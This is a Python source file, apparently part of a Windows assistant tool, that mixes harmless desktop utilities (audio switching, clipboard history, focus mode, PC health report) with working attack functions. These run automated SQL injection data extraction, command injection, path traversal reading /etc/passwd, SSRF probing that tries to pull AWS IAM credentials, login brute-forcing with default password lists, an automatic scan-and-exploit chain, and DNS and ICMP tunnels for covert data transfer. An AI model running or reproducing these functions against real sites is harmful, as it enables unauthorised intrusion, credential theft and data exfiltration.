    int GetShareMode(string pszDeviceName, IntPtr pMode);
    int SetShareMode(string pszDeviceName, IntPtr pMode);
    int GetPropertyValue(string pszDeviceName, IntPtr pKey, out IntPtr pv);
    int SetPropertyValue(string pszDeviceName, IntPtr pKey, IntPtr pv);
    int SetDefaultEndpoint(string pszDeviceName, int role);
    int SetEndpointVisibility(string pszDeviceName, bool visible);
}}
"@
$pc = New-Object PolicyConfig
$iface = [IPolicyConfigVista]$pc
$iface.SetDefaultEndpoint("{target.id}", 0)  # 0=eConsole
$iface.SetDefaultEndpoint("{target.id}", 1)  # 1=eMultimedia
$iface.SetDefaultEndpoint("{target.id}", 2)  # 2=eCommunications
'''
                    subprocess.run(
                        ['powershell', '-NoProfile', '-Command', ps_script],
                        capture_output=True, text=True, timeout=10
                    )
                    result_parts.append(f"  [SUCCESS] 已切换到: {target.FriendlyName}")
                except Exception as e:
                    result_parts.append(f"  [ERROR] 切换失败: {e}")
                    result_parts.append("  可手动切换: control mmsys.cpl sounds")
                finally:
                    pythoncom.CoUninitialize()
            else:
                result_parts.append("  [INFO] 需要pycaw库, 请手动切换: control mmsys.cpl sounds")
            return '\n'.join(result_parts)
        except Exception as e:
            return f"[ERROR] Audio commander failed: {e}"


def _clipboard_history(self, count: int = 10) -> str:
        """剪贴板历史记录"""
        try:
            if not WIN32_AVAILABLE:
                return "[ERROR] 需要 win32clipboard 模块"
            result_parts = []
            result_parts.append(f"[CLIPBOARD HISTORY] 最近 {count} 条记录")
            result_parts.append("-" * 50)
            if not hasattr(self, '_clipboard_history_store'):
                self._clipboard_history_store = []
            try:
                win32clipboard.OpenClipboard()
                data = ""
                if win32clipboard.IsClipboardFormatAvailable(win32clipboard.CF_TEXT):
                    data = win32clipboard.GetClipboardData().decode('utf-8', errors='replace')
                elif win32clipboard.IsClipboardFormatAvailable(win32clipboard.CF_UNICODETEXT):
                    data = win32clipboard.GetClipboardData()
                win32clipboard.CloseClipboard()
                if data and (not self._clipboard_history_store or self._clipboard_history_store[-1] != data):
                    self._clipboard_history_store.append(data)
                    if len(self._clipboard_history_store) > 50:
                        self._clipboard_history_store = self._clipboard_history_store[-50:]
            except Exception: pass
            if not self._clipboard_history_store:
                result_parts.append("  (暂无剪贴板历史记录)")
                result_parts.append("  (复制内容后会自动记录)")
            else:
                start = max(0, len(self._clipboard_history_store) - count)
                for i in range(start, len(self._clipboard_history_store)):
                    text = self._clipboard_history_store[i]
                    preview = text[:80].replace('\n', '\\n').replace('\r', '')
                    result_parts.append(f"  [{i + 1}] {preview}")
                    if len(text) > 80:
                        result_parts.append(f"       ... (共{len(text)}字符)")
            result_parts.append("-" * 50)
            return '\n'.join(result_parts)
        except Exception as e:
            return f"[ERROR] Clipboard history failed: {e}"


def _focus_mode(self) -> str:
        """免打扰模式切换"""
        try:
            if not hasattr(self, '_focus_mode_active'):
                self._focus_mode_active = False
            self._focus_mode_active = not self._focus_mode_active
            result_parts = []
            if self._focus_mode_active:
                result_parts.append("[FOCUS MODE] 免打扰模式已开启")
                result_parts.append("-" * 50)
                desktop_hwnd = win32gui.FindWindow("Progman", "Program Manager")
                if desktop_hwnd:
                    win32gui.ShowWindow(desktop_hwnd, 0)
                    result_parts.append("  [OK] 桌面图标已隐藏")
                try:
                    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                        r"Software\Microsoft\Windows\CurrentVersion\Notifications\Settings",
                        0, winreg.KEY_SET_VALUE)
                    winreg.SetValueEx(key, "NOC_GLOBAL_SETTING_ALLOW_NOTIFICATION_SOUND", 0, winreg.REG_DWORD, 0)
                    winreg.CloseKey(key)
                    result_parts.append("  [OK] 通知声音已静音")
                except Exception: pass
                try:
                    subprocess.run(
                        'powershell -Command "Set-ItemProperty -Path HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Notifications\\Settings -Name NOC_GLOBAL_SETTING_TOASTS_ENABLED -Value 0 -Type DWord"',
                        shell=True, check=False, timeout=3
                    )
                    result_parts.append("  [OK] 通知已禁用")
                except Exception: pass
                result_parts.append("")
                result_parts.append("  再次执行 focus_mode 恢复")
            else:
                result_parts.append("[FOCUS MODE] 免打扰模式已关闭")
                result_parts.append("-" * 50)
                desktop_hwnd = win32gui.FindWindow("Progman", "Program Manager")
                if desktop_hwnd:
                    win32gui.ShowWindow(desktop_hwnd, 1)
                    result_parts.append("  [OK] 桌面图标已恢复")
                try:
                    subprocess.run(
                        'powershell -Command "Set-ItemProperty -Path HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Notifications\\Settings -Name NOC_GLOBAL_SETTING_TOASTS_ENABLED -Value 1 -Type DWord"',
                        shell=True, check=False, timeout=3
                    )
                    result_parts.append("  [OK] 通知已恢复")
                except Exception: pass
            result_parts.append("-" * 50)
            return '\n'.join(result_parts)
        except Exception as e:
            return f"[ERROR] Focus mode failed: {e}"


def _pc_health(self) -> str:
        """电脑健康状态一句话总结"""
        try:
            if not PSUTIL_AVAILABLE:
                return "[ERROR] 需要 psutil 模块"
            cpu_percent = psutil.cpu_percent(interval=1)
            memory = psutil.virtual_memory()
            disk = psutil.disk_usage('C:\\')
            net = psutil.net_io_counters()
            if cpu_percent < 20:
                cpu_status = "CPU在摸鱼"
            elif cpu_percent < 50:
                cpu_status = "CPU正常工作中"
            elif cpu_percent < 80:
                cpu_status = "CPU有点忙"
            else:
                cpu_status = "CPU快累瘫了"
            mem_pct = memory.percent
            if mem_pct < 40:
                mem_status = "内存很宽裕"
            elif mem_pct < 70:
                mem_status = "内存还算够用"
            elif mem_pct < 85:
                mem_status = "内存快满了"
            else:
                mem_status = "内存要炸了"
            disk_pct = disk.percent
            if disk_pct < 40:
                disk_status = "磁盘在喊累(空)"
            elif disk_pct < 70:
                disk_status = "磁盘还扛得住"
            elif disk_pct < 85:
                disk_status = "磁盘有点挤了"
            else:
                disk_status = "磁盘在喊累"
            net_speed = net.bytes_sent + net.bytes_recv
            if net_speed < 1024 * 1024:
                net_status = "网络在打盹"
            elif net_speed < 10 * 1024 * 1024:
                net_status = "网络正常运转"
            else:
                net_status = "网络在狂奔"
            health_score = 100
            health_score -= max(0, cpu_percent - 30) * 0.5
            health_score -= max(0, mem_pct - 40) * 0.5
            health_score -= max(0, disk_pct - 50) * 0.3
            if health_score >= 80:
                health = "优秀 - 你的电脑精神很好"
            elif health_score >= 60:
                health = "良好 - 你的电脑还不错"
            elif health_score >= 40:
                health = "一般 - 你的电脑可能需要关心"
            else:
                health = "较差 - 你的电脑在求救"
            result = f"""[PC HEALTH] 电脑健康报告
  ┌────────────────────────────────────┐
  │ {cpu_status:<35} │
  │ {mem_status:<35} │
  │ {disk_status:<35} │
  │ {net_status:<35} │
  ├────────────────────────────────────┤
  │ CPU: {cpu_percent:.1f}%  {'█' * int(cpu_percent // 5):<20} │
  │ MEM: {mem_pct:.1f}%  {'█' * int(mem_pct // 5):<20} │
  │ DSK: {disk_pct:.1f}%  {'█' * int(disk_pct // 5):<20} │
  ├────────────────────────────────────┤
  │ 健康评分: {health_score:.0f}/100                    │
  │ 综合结论: {health:<28} │
  └────────────────────────────────────┘"""
            return result
        except Exception as e:
            return f"[ERROR] PC health check failed: {e}"


def _light_show(self, duration: int = 10) -> str:
        """桌面灯效表演"""
        try:
            result_parts = []
            result_parts.append(f"[LIGHT SHOW] 桌面灯效表演 ({duration}秒)")
            result_parts.append("-" * 50)
            if not WIN32_AVAILABLE:
                return "[ERROR] 需要 win32api/win32gui 模块"
            start_time = time.time()
            frames = 0
            def get_all_windows():
                windows = []
                def callback(hwnd, extra):
                    if win32gui.IsWindowVisible(hwnd) and win32gui.GetWindowText(hwnd):
                        rect = win32gui.GetWindowRect(hwnd)
                        w = rect[2] - rect[0]
                        h = rect[3] - rect[1]
                        if w > 50 and h > 50:
                            windows.append(hwnd)
                    return True
                win32gui.EnumWindows(callback, None)
                return windows
            windows = get_all_windows()
            if not windows:
                return "[LIGHT SHOW] 未找到窗口"
            result_parts.append(f"  使用 {len(windows)} 个窗口进行表演")
            colors = [
                (255, 0, 0),    # 红
                (0, 255, 0),    # 绿
                (0, 0, 255),    # 蓝
                (255, 255, 0),  # 黄
                (255, 0, 255),  # 紫
                (0, 255, 255),  # 青
                (255, 255, 255),# 白
            ]
            while time.time() - start_time < duration:
                color = colors[frames % len(colors)]
                rgb = win32api.RGB(*color)
                for hwnd in windows:
                    try:
                        win32gui.SetWindowPos(hwnd, 0, 0, 0, 0, 0,
                            win32con.SWP_NOMOVE | win32con.SWP_NOSIZE | win32con.SWP_SHOWWINDOW)
                        win32gui.FlashWindow(hwnd, True)
                        win32gui.FlashWindow(hwnd, False)
                    except Exception:
                        continue
                frames += 1
                if frames % 5 == 0:
                    time.sleep(0.05)
                if frames >= 30:
                    break
            result_parts.append(f"  表演完成! 共 {frames} 帧")
            result_parts.append("-" * 50)
            return '\n'.join(result_parts)
        except Exception as e:
            return f"[ERROR] Light show failed: {e}"


def _identity_kit(self) -> str:
        """电脑身份人格画像"""
        try:
            result_parts = []
            result_parts.append("[IDENTITY KIT] 电脑人格画像")
            result_parts.append("  ╔══════════════════════════════════╗")
            computer_name = os.environ.get('COMPUTERNAME', 'Unknown')
            username = os.environ.get('USERNAME', 'Unknown')
            result_parts.append(f"  ║ 电脑名称: {computer_name:<22} ║")
            result_parts.append(f"  ║ 当前用户: {username:<24} ║")
            os_info = platform.platform()
            result_parts.append(f"  ║ 操作系统: {os_info[:28]:<28} ║")
            cpu_count = os.cpu_count() or 0
            cpu_brand = "Unknown"
            if PSUTIL_AVAILABLE:
                cpu_brand = platform.processor() or "Unknown"
            result_parts.append(f"  ║ CPU核心: {cpu_count:<26} ║")
            if PSUTIL_AVAILABLE:
                boot_time = datetime.fromtimestamp(psutil.boot_time())
                uptime = datetime.now() - boot_time
                days = uptime.days
                hours = uptime.seconds // 3600
                minutes = (uptime.seconds % 3600) // 60
                uptime_str = f"{days}天{hours}时{minutes}分"
                result_parts.append(f"  ║ 已开机: {uptime_str:<28} ║")
            if PSUTIL_AVAILABLE:
                mem = psutil.virtual_memory()
                total_gb = mem.total / (1024**3)
                mem_str = f"{total_gb:.1f} GB"
                result_parts.append(f"  ║ 内存总量: {mem_str:<26} ║")
            if PSUTIL_AVAILABLE:
                apps_count = {}
                for proc in psutil.process_iter(['name']):
                    try:
                        name = proc.info['name']
                        if name:
                            apps_count[name] = apps_count.get(name, 0) + 1
                    except Exception:
                        continue
                top_apps = sorted(apps_count.items(), key=lambda x: -x[1])[:5]
                result_parts.append(f"  ║ 活跃进程Top:                          ║")
                for name, count in top_apps:
                    result_parts.append(f"  ║   {name:<30} x{count:<3}       ║")
            result_parts.append(f"  ║                                        ║")
            if PSUTIL_AVAILABLE:
                cpu_percent = psutil.cpu_percent(interval=0.5)
                mem_percent = psutil.virtual_memory().percent
                disk_percent = psutil.disk_usage('C:\\').percent
                apps_running = len(psutil.pids())
                if cpu_percent < 15 and mem_percent < 40:
                    personality = "🌙 摸鱼王 - 大部分资源闲置, 你正在偷偷休息"
                elif cpu_percent > 70 and mem_percent > 70:
                    personality = "🔥 工作狂 - 你的电脑正在全力输出"
                elif apps_running > 200:
                    personality = "📂 仓库管理员 - 开了好多程序, 但真正用的没几个"
                elif cpu_percent > 50:
                    personality = "⚡ 性能怪兽 - 你的电脑正在燃烧性能"
                elif disk_percent > 85:
                    personality = "📦 囤积症患者 - 硬盘快塞满了"
                else:
                    personality = "💼 普通上班族 - 稳定运行中"
                result_parts.append(f"  ║ 人格类型: {personality:<34} ║")
            result_parts.append("  ╚══════════════════════════════════╝")
            return '\n'.join(result_parts)
        except Exception as e:
            return f"[ERROR] Identity kit failed: {e}"


def _sql_exploit(self, url: str, param: str, payload_type: str = 'union') -> str:
        """SQL注入利用 - 提取数据库数据"""
        if not REQUESTS_AVAILABLE:
            return "[ERROR] requests module not available."
        results = [f"[SQL EXPLOIT] 目标: {url}", f"[SQL EXPLOIT] 参数: {param}", "=" * 60, "[*] 检测注入点..."]
        base_url = f"{url}?{param}="
        detection_payloads = [
            ("'", "单引号"), ("' OR '1'='1", "逻辑真"), ("' AND '1'='2", "逻辑假"),
            ("' OR 1=1--", "注释注入"), ("' UNION SELECT NULL--", "UNION探测"),
            ("' AND SLEEP(5)--", "时间盲注"), ("' AND 1=1--", "布尔真"), ("' AND 1=2--", "布尔假"),
        ]
        is_vulnerable = False
        for payload, desc in detection_payloads:
            try:
                test_url = base_url + quote(payload)
                start = time.time()
                resp = requests.get(test_url, timeout=10, verify=False)
                elapsed = time.time() - start
                sql_errors = ['sql syntax', 'mysql_fetch', 'ora-', 'sqlstate', 'unclosed quotation',
                              'microsoft ole db', 'postgresql', 'sqlite', 'pdoexception', 'mysqli', 'mysql error']
                if any(err in resp.text.lower() for err in sql_errors):
                    results.append(f"[!] SQL错误特征! ({desc})")
                    is_vulnerable = True
                    break
                if elapsed >= 4.5 and 'SLEEP' in payload:
                    results.append(f"[!] 时间盲注! 响应: {elapsed:.2f}s")
                    is_vulnerable = True
                    break
                if "1=1" in payload:
                    try:
                        r1 = requests.get(base_url + quote("' AND 1=1--"), timeout=5, verify=False)
                        r2 = requests.get(base_url + quote("' AND 1=2--"), timeout=5, verify=False)
                        if abs(len(r1.text) - len(r2.text)) > 50:
                            results.append("[!] 布尔盲注! 真/假响应不同")
                            is_vulnerable = True
                            break
                    except Exception: pass
            except Exception:
                continue
        if not is_vulnerable:
            results.append("[*] 未检测到SQL注入")
            return '\n'.join(results)
        results.append("[+] SQL注入确认!")
        results.append("-" * 40)
        max_cols = 0
        for cols in range(1, 20):
            try:
                payload = f"' UNION SELECT {','.join(['NULL'] * cols)}--"
                resp = requests.get(base_url + quote(payload), timeout=5, verify=False)
                if not any(err in resp.text.lower() for err in ['error', 'syntax', 'warning']):
                    max_cols = cols
                    results.append(f"[+] 列数: {cols}")
                    break
            except Exception:
                continue
        if max_cols == 0:
            results.append("[*] 无法确定列数")
            return '\n'.join(results)
        results.append("[*] 提取数据库信息...")
        for i in range(1, max_cols + 1):
            pos = i - 1
            nulls_before = ','.join(['NULL'] * pos)
            nulls_after = ','.join(['NULL'] * (max_cols - i))
            for func in ['@@version', 'version()', 'database()', 'user()', 'current_user()']:
                if pos == 0:
                    payload = f"' UNION SELECT {func},{nulls_after}--"
                elif pos == max_cols - 1:
                    payload = f"' UNION SELECT {nulls_before},{func}--"
                else:
                    payload = f"' UNION SELECT {nulls_before},{func},{nulls_after}--"
                try:
                    resp = requests.get(base_url + quote(payload), timeout=5, verify=False)
                    clean = re.sub(r'<[^>]+>', ' ', resp.text)
                    clean = ' '.join(clean.split())
                    for ver_pattern in [r'\d+\.\d+\.\d+', r'\d+\.\d+']:
                        matches = re.findall(ver_pattern, clean)
                        for m in matches[:3]:
                            if len(m) > 2:
                                results.append(f"[+] {func}: {m}")
                                break
                except Exception:
                    continue
        results.append("[*] 提取表名...")
        for table, col in [('information_schema.tables', 'table_name'), ('information_schema.columns', 'column_name')]:
            for i in range(1, max_cols + 1):
                pos = i - 1
                nulls_before = ','.join(['NULL'] * pos)
                nulls_after = ','.join(['NULL'] * (max_cols - i))
                if pos == 0:
                    payload = f"' UNION SELECT {col},{nulls_after} FROM {table} LIMIT 10--"
                elif pos == max_cols - 1:
                    payload = f"' UNION SELECT {nulls_before},{col} FROM {table} LIMIT 10--"
                else:
                    payload = f"' UNION SELECT {nulls_before},{col},{nulls_after} FROM {table} LIMIT 10--"
                try:
                    resp = requests.get(base_url + quote(payload), timeout=5, verify=False)
                    if len(resp.text) > 100 and not any(err in resp.text.lower() for err in ['error', 'syntax']):
                        clean = re.sub(r'<[^>]+>', ' ', resp.text)
                        tmatches = re.findall(r'\b[a-zA-Z_][a-zA-Z0-9_]{2,30}\b', clean)
                        for tm in tmatches[:10]:
                            if tm.lower() not in ['null', 'select', 'from', 'where', 'limit']:
                                results.append(f"[+] 表名: {tm}")
                except Exception:
                    continue
                break
            break
        results.append("=" * 60)
        return '\n'.join(results)


def _rce_exploit(self, url: str, param: str, command: str = 'whoami') -> str:
        """远程命令执行利用"""
        if not REQUESTS_AVAILABLE:
            return "[ERROR] requests module not available."
        results = [f"[RCE EXPLOIT] 目标: {url}", f"[RCE EXPLOIT] 命令: {command}", "=" * 60, "[*] 尝试命令注入..."]
        base_url = f"{url}?{param}="
        payloads = [
            (f"; {command}", "分号"), (f"| {command}", "管道"), (f"&& {command}", "逻辑与"),
            (f"& {command}", "后台"), (f"`{command}`", "反引号"), (f"$({command})", "美元括号"),
            (f"%0a{command}", "换行"), (f"|{command}|", "双管道"),
            (f"& {command} &", "Win后台"), (f";{command};", "Linux分号"),
        ]
        for payload, desc in payloads:
            try:
                resp = requests.get(base_url + quote(payload), timeout=10, verify=False)
                for cmd_out in [command, 'root', 'admin', 'uid=', 'gid=', 'groups=', 'nt authority']:
                    if cmd_out in resp.text.lower():
                        results.append(f"[!] RCE成功! ({desc})")
                        results.append(f"[输出] {resp.text[:1000]}")
                        return '\n'.join(results)
            except Exception:
                continue
        try:
            resp = requests.post(url, data={param: f"; {command}"}, timeout=10, verify=False)
            if command in resp.text.lower():
                results.append("[!] POST RCE成功!")
                results.append(f"[输出] {resp.text[:1000]}")
                return '\n'.join(results)
        except Exception: pass
        try:
            headers = {'User-Agent': f"; {command}", 'Referer': f"; {command}", 'X-Forwarded-For': f"; {command}"}
            resp = requests.get(url, headers=headers, timeout=10, verify=False)
            if command in resp.text.lower():
                results.append("[!] 请求头RCE成功!")
                results.append(f"[输出] {resp.text[:1000]}")
                return '\n'.join(results)
        except Exception: pass
        results.append("[*] 未发现RCE漏洞")
        return '\n'.join(results)


def _file_read(self, url: str, param: str, file_path: str = '/etc/passwd') -> str:
        """文件包含/路径遍历"""
        if not REQUESTS_AVAILABLE:
            return "[ERROR] requests module not available."
        results = [f"[FILE READ] 目标: {url}", f"[FILE READ] 文件: {file_path}", "=" * 60, "[*] 尝试读取文件..."]
        base_url = f"{url}?{param}="
        is_windows = 'win' in file_path.lower() or '\\' in file_path
        if is_windows:
            paths = [file_path, file_path.replace('/', '\\'), '..\\..\\' + file_path]
            paths.extend(['..\\..\\windows\\win.ini', '..\\..\\windows\\system32\\drivers\\etc\\hosts'])
        else:
            paths = [file_path, '../' + file_path, '../../' + file_path, '../../../' + file_path, '../../../../' + file_path]
            paths.extend(['/etc/passwd', '/etc/hosts', '/proc/self/environ', '/var/log/apache2/access.log'])
        for path in paths:
            try:
                resp = requests.get(base_url + quote(path), timeout=10, verify=False)
                if resp.status_code == 200 and len(resp.text) > 50:
                    indicators = ['root:x:', 'administrator', '[extensions]', '127.0.0.1', 'localhost', 'uid=', 'gid=', 'password']
                    if '<title>Index of' in resp.text or 'Parent Directory' in resp.text:
                        results.append(f"[!] 目录列表! {path}")
                        results.append(f"[内容] {resp.text[:500]}")
                        return '\n'.join(results)
                    for ind in indicators:
                        if ind in resp.text.lower():
                            results.append(f"[!] 文件读取成功! {path}")
                            results.append(f"[内容] {resp.text[:2000]}")
                            return '\n'.join(results)
            except Exception:
                continue
        results.append("[*] 尝试PHP wrapper...")
        for wp in [f"php://filter/read=convert.base64-encode/resource={file_path}", f"file://{file_path}"]:
            try:
                resp = requests.get(base_url + quote(wp), timeout=10, verify=False)
                if resp.status_code == 200 and len(resp.text) > 50:
                    try:
                        decoded = base64.b64decode(resp.text[:500]).decode('utf-8', errors='ignore')
                        if len(decoded) > 10:
                            results.append("[!] PHP wrapper读取成功!")
                            results.append(f"[解码] {decoded}")
                            return '\n'.join(results)
                    except Exception: pass
            except Exception:
                continue
        results.append("[*] 未读取到文件内容")
        return '\n'.join(results)


def _ssrf_exploit(self, url: str, param: str) -> str:
        """SSRF利用 - 内网探测"""
        if not REQUESTS_AVAILABLE:
            return "[ERROR] requests module not available."
        results = [f"[SSRF EXPLOIT] 目标: {url}", "=" * 60, "[*] 探测内网服务..."]
        base_url = f"{url}?{param}="
        targets = [
            ('127.0.0.1', 'localhost'), ('10.0.0.1', '10.x'), ('172.16.0.1', '172.16.x'),
            ('192.168.1.1', '192.168.x'), ('169.254.169.254', 'AWS元数据'),
            ('metadata.google.internal', 'GCP元数据'), ('100.100.100.200', '阿里云元数据'),
        ]
        found = []
        for ip, desc in targets:
            for proto in ['http://', 'https://', 'file://', 'gopher://']:
                try:
                    target = f"{proto}{ip}"
                    resp = requests.get(base_url + quote(target), timeout=5, verify=False)
                    if resp.status_code == 200 and len(resp.text) > 0:
                        is_ssrf = ('root:' in resp.text or '[extensions]' in resp.text or
                                   'server:' in resp.text.lower() or '<html>' in resp.text.lower())
                        if is_ssrf:
                            line = f"[!] SSRF成功! {ip} ({desc}) via {proto}"
                            if line not in found:
                                found.append(line)
                                results.append(line)
                                results.append(f"[响应] {resp.text[:300]}")
                                if '169.254.169.254' in target:
                                    results.append("[*] 尝试获取AWS凭证...")
                                    try:
                                        aws_resp = requests.get(base_url + quote('http://169.254.169.254/latest/meta-data/iam/security-credentials/'), timeout=5, verify=False)
                                        if aws_resp.status_code == 200:
                                            results.append(f"[AWS] {aws_resp.text[:200]}")
                                    except Exception: pass
                except Exception:
                    continue
        if not found:
            results.append("[*] 未发现SSRF漏洞")
        else:
            results.append(f"[+] 发现 {len(found)} 个SSRF目标")
        return '\n'.join(results)


def _bruteforce(self, url: str, username_field: str, password_field: str) -> str:
        """表单暴力破解"""
        if not REQUESTS_AVAILABLE:
            return "[ERROR] requests module not available."
        results = [f"[BRUTEFORCE] 目标: {url}", "=" * 60]
        usernames = ['admin', 'root', 'administrator', 'user', 'test', 'guest', 'manager', 'superadmin', 'sysadmin', 'webadmin', 'demo', 'oracle', 'mysql', 'postgres']
        passwords = ['password', '123456', '12345678', 'admin', 'admin123', 'root', 'toor', 'qwerty', 'abc123', 'letmein', 'welcome', 'P@ssw0rd', 'password123', '1234567890', 'Admin@123', 'changeme', 'secret', 'default', 'test', 'guest']
        session = requests.Session()
        success_indicators = ['dashboard', 'welcome', 'admin', 'home', '登录成功', '欢迎回来', '管理后台', 'logout', 'profile']
        fail_indicators = ['invalid', 'incorrect', 'error', 'failed', 'wrong', '密码错误', '登录失败', 'try again', '不存在']
        results.append(f"[*] 测试: {len(usernames)} 用户名 × {len(passwords)} 密码 = {len(usernames) * len(passwords)} 组合")
        attempts = 0
        for user in usernames:
            for pwd in passwords:
                attempts += 1
                if attempts % 50 == 0:
                    results.append(f"[*] 进度: {attempts}")
                try:
                    resp = session.post(url, data={username_field: user, password_field: pwd}, timeout=5, allow_redirects=True)
                    response_text = resp.text.lower()
                    is_success = any(ind in response_text for ind in success_indicators)
                    is_fail = any(ind in response_text for ind in fail_indicators)
                    if is_success and not is_fail:
                        results.append(f"[!] 找到凭证! {user}:{pwd}")
                        results.append("=" * 60)
                        return '\n'.join(results)
                    if attempts % 50 == 0:
                        time.sleep(0.3)
                except Exception:
                    continue
        results.append(f"[*] 未找到有效凭证,共尝试 {attempts} 次")
        return '\n'.join(results)


def _auto_exploit(self, target_url: str) -> str:
        """自动渗透链"""
        if not REQUESTS_AVAILABLE:
            return "[ERROR] requests module not available."
        from datetime import datetime
        results = [f"[AUTO EXPLOIT] 目标: {target_url}", "=" * 70, f"时间: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}", "=" * 70]
        parsed = urlparse(target_url)
        host = parsed.netloc.split(':')[0]
        port = parsed.port or (443 if parsed.scheme == 'https' else 80)
        base_url = f"{parsed.scheme}://{host}:{port}"
        results.append("[1] 指纹识别")
        results.append("-" * 40)
        try:
            resp = requests.get(target_url, timeout=10, verify=False, allow_redirects=True)
            results.append(f"  Server: {resp.headers.get('Server', 'Unknown')}")
            results.append(f"  X-Powered-By: {resp.headers.get('X-Powered-By', 'Unknown')}")
            cms_map = {'WordPress': ['wp-content', 'wp-includes'], 'Drupal': ['drupal'], 'Joomla': ['joomla'],
                       'Laravel': ['laravel', 'csrf-token'], 'Django': ['csrftoken'], 'Spring Boot': ['actuator', 'swagger'],
                       'ThinkPHP': ['thinkphp'], 'phpMyAdmin': ['phpmyadmin']}
            for cms, inds in cms_map.items():
                if any(i in resp.text for i in inds):
                    results.append(f"  CMS: {cms}")
        except Exception as e:
            results.append(f"  指纹识别失败: {e}")
        results.append("")
        results.append("[2] 端口扫描")
        results.append("-" * 40)
        common_ports = [(21,'FTP'),(22,'SSH'),(80,'HTTP'),(443,'HTTPS'),(3306,'MySQL'),(3389,'RDP'),(6379,'Redis'),(8080,'HTTP-Alt'),(9200,'ES'),(27017,'MongoDB')]
        open_ports = []
        for port, svc in common_ports:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                if sock.connect_ex((host, port)) == 0:
                    open_ports.append((port, svc))
                    results.append(f"  [+] {port} ({svc})")
                sock.close()
            except Exception:
                continue
        results.append("")
        results.append("[3] 敏感路径扫描")
        results.append("-" * 40)
        sensitive_paths = ['.env', '.git/config', 'wp-config.php', 'config.php', 'admin/', 'login/', 'api/', 'phpmyadmin/', 'robots.txt', 'backup.sql', 'phpinfo.php', 'wp-admin/']
        found_paths = []
        for path in sensitive_paths:
            try:
                resp = requests.get(f"{base_url}/{path}", timeout=3, verify=False)
                if resp.status_code == 200:
                    found_paths.append(path)
                    results.append(f"  [+] {path}")
                elif resp.status_code in [301, 302, 401, 403]:
                    results.append(f"  [!] {path} (状态: {resp.status_code})")
            except Exception:
                continue
        results.append("")
        results.append("[4] 漏洞检测")
        results.append("-" * 40)
        found_vulns = []
        for p in ['id', 'page', 'cat', 'q']:
            try:
                resp = requests.get(f"{target_url}?{p}=1'", timeout=5, verify=False)
                if any(ind in resp.text.lower() for ind in ['sql', 'mysql', 'syntax', 'ora-']):
                    found_vulns.append(f"SQL注入: {p}")
                    results.append(f"  [!] SQL注入: {p}")
                    break
            except Exception:
                continue
        try:
            xss = "<script>alert(1)</script>"
            resp = requests.get(f"{target_url}?q={quote(xss)}", timeout=5, verify=False)
            if xss in resp.text:
                found_vulns.append("XSS反射")
                results.append("  [!] 反射型XSS")
        except Exception: pass
        results.append("")
        results.append("=" * 70)
        results.append("[5] 汇总报告")
        results.append(f"  开放端口: {len(open_ports)}  敏感路径: {len(found_paths)}  漏洞: {len(found_vulns)}")
        if found_vulns:
            results.append("  [!] 漏洞:")
            for v in found_vulns:
                results.append(f"    - {v}")
        results.append("=" * 70)
        return '\n'.join(results)


def _dns_tunnel(self, action: str, domain: str, data: str = None) -> str:
        """DNS隧道 - TXT查询/子域名编码"""
        try:
            if not DNS_AVAILABLE:
                return "[ERROR] dnspython not available. pip install dnspython"
            if action == "recv":
                results = []
                resolver = dns.resolver.Resolver()
                answers = resolver.resolve(domain, 'TXT')
                for rdata in answers:
                    txt = rdata.to_text().strip('"')
                    try:
                        decoded = base64.b64decode(txt).decode('utf-8', errors='replace')
                        results.append(decoded)
                    except Exception:
                        results.append(txt)
                return f"[DNS TUNNEL] Received {len(results)} TXT records:\n" + "\n".join(results)
            elif action == "send":
                if not data:
                    return "[ERROR] data required for send"
                encoded = base64.b64encode(data.encode()).decode()
                chunk_size = 32
                chunks = [encoded[i:i+chunk_size] for i in range(0, len(encoded), chunk_size)]
                subdomains = [f"{chunk}.{domain}" for chunk in chunks]
                return f"[DNS TUNNEL] Encoded into {len(subdomains)} subdomains:\n" + "\n".join(subdomains[:20])
            else:
                return f"[ERROR] Unknown action: {action}"
        except Exception as e:
            return f"[ERROR] DNS tunnel failed: {e}"


def _icmp_tunnel(self, action: str, data: str = None) -> str:
        """ICMP隧道 - 原始套接字ICMP Echo"""
        try:
            if action == "send":
                if not data:
                    return "[ERROR] data required for send"
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
                    sock.settimeout(5)
                    icmp_type, icmp_code, icmp_id, icmp_seq = 8, 0, os.getpid() & 0xFFFF, 1
                    payload = base64.b64decode(data)
                    header = struct.pack('<BBHHH', icmp_type, icmp_code, 0, icmp_id, icmp_seq)
                    chk = self._icmp_checksum(header + payload)
                    header = struct.pack('<BBHHH', icmp_type, icmp_code, chk, icmp_id, icmp_seq)
                    sock.sendto(header + payload, ('127.0.0.1', 0))
                    sock.close()
                    return f"[ICMP TUNNEL] Sent {len(payload)} bytes"
                except PermissionError:
                    return "[ERROR] ICMP需要管理员权限"
            elif action == "recv":
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
                    sock.settimeout(10)
                    received = []
                    start = time.time()
                    while time.time() - start < 10:
                        try:
                            packet, addr = sock.recvfrom(65535)
                            if packet[20] == 8:  # Echo Request
                                received.append(f"[from {addr[0]}] {base64.b64encode(packet[28:]).decode()}")
                        except socket.timeout:
                            break
                    sock.close()
                    return f"[ICMP TUNNEL] Received {len(received)} packets:\n" + "\n".join(received) if received else "[ICMP] No packets"
                except PermissionError:
                    return "[ERROR] ICMP需要管理员权限"
            elif action == "ping":
                return "[ICMP] Use ping_host tool for connectivity test"
            else:
                return f"[ERROR] Unknown action: {action}"
        except Exception as e:
            return f"[ERROR] ICMP tunnel failed: {e}"


def _https_fingerprint_spoof(self, url: str) -> str:
        """HTTPS指纹伪装"""
        try:
            if not REQUESTS_AVAILABLE:
                return "[ERROR] requests not available"
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.8',
                'Accept-Encoding': 'gzip, deflate, br',
                'Sec-Ch-Ua': '"Google Chrome";v="125", "Chromium";v="125"',
